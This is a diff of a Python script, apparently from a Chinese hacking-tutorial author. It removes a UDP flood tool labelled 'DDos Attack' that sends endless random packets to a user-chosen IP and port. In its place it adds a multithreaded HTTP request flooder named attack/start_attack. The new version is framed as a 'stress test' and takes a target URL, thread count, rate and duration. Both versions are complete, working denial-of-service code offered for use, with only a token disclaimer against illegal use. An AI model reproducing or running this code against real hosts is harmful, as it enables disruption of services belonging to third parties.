@@ -1,54 +1,53 @@
-# python3
-
-import sys
-import os
+import threading
+import requests
 import time
-import socket
-import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
+# 停止标志
+stop_event = threading.Event()
 
-os.system("clear")
-os.system("figlet DDos Attack")
-print (" ")
-print ("/---------------------------------------------------\\ ")
-print ("|   作者          : Andysun06                       |")
-print ("|   作者github    : https://github.com/Andysun06    |")
-print ("|   kali-QQ学习群 : 909533854                       |")
-print ("|   版本          : V1.1.0                          |")
-print ("|   严禁转载，程序教程仅发布在CSDN（用户Andysun06）   |")
-print ("\\---------------------------------------------------/")
-print (" ")
-print (" -----------------[请勿用于违法用途]----------------- ")
-print (" ")
+def attack(url, rate_per_second):
+    interval = 1.0 / rate_per_second  # 请求间隔时间（秒）
+    session = requests.Session()
 
-target = input("请输入目标域名或IP : ")
+    while not stop_event.is_set():
+        start_time = time.time()
+        try:
+            response = session.get(url, timeout=5)
+            print(f"[+] 请求成功: {response.status_code}")
+        except Exception as e:
+            print(f"[-] 请求失败: {e}")
+        
+        elapsed = time.time() - start_time
+        sleep_time = max(0, interval - elapsed)
+        time.sleep(sleep_time)
 
-try:
-    ip = socket.gethostbyname(target)
-except socket.gaierror:
-    print("无法解析域名，请检查输入是否正确。")
-    sys.exit()
+def start_attack(url, num_threads, rate_per_thread, duration_seconds):
+    threads = []
 
-port = int(input("攻击端口      : "))
-sd = int(input("攻击速度(1~1000) : "))
+    print(f"[!] 开始压力测试: {num_threads} 个线程，每线程 {rate_per_thread} 次/秒，持续 {duration_seconds} 秒")
 
-os.system("clear")
+    for _ in range(num_threads):
+        thread = threading.Thread(target=attack, args=(url, rate_per_thread))
+        thread.daemon = True
+        thread.start()
+        threads.append(thread)
 
-sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
-     time.sleep((1000-sd)/2000)
+    try:
+        time.sleep(duration_seconds)
+    finally:
+        stop_event.set()
+        print("[!] 测试结束，正在停止所有线程...")
+
+    for thread in threads:
+        thread.join()
+
+    print("[+] 所有线程已停止")
+
+# 示例：自定义参数
+if __name__ == "__main__":
+    target_url = input("请输入目标URL（例如 http://127.0.0.1:8000）: ")
+    threads = int(input("请输入线程数: "))
+    rate = float(input("请输入每线程每秒请求次数: "))
+    duration = int(input("请输入测试持续时间（秒）: "))
+
+    start_attack(target_url, threads, rate, duration)
